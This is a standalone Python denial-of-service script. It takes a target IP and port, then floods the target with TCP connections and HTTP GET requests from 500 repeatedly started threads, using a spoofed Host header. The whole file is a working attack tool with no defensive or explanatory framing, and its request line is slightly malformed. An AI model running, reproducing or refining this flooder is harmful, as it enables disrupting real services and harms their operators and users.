import socket, threading, sys, os

try:
	target = sys.argv[1]
	port = int(sys.argv[2])
	speed = int(sys.argv[3])
	fake_ip = '104.74.112.38'
except:
	print("""
Usage:
 python3 {} <target_ip> <port> <speed>
		""".format(os.path.basename(__file__)))
	exit()

def dos():
	sent = 0
	while True:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((target, port))
		s.sendto(("GET /"+target+"HTTP/1.1\r\n").encode('ascii'), (target, port))
		s.sendto(("HOST: "+fake_ip+"\r\n\r\n").encode('ascii'), (target, port))
		s.close()
		sent += 1
		print(f'sent {sent}')


threads = []
power = 500
while True:
 for i in range(power):
  x = threading.Thread(target=dos)
  x.daemon = True
  threads.append(x)
 for i in range(power):
  threads[i].start()
 for i in range(power):
  threads[i].join()
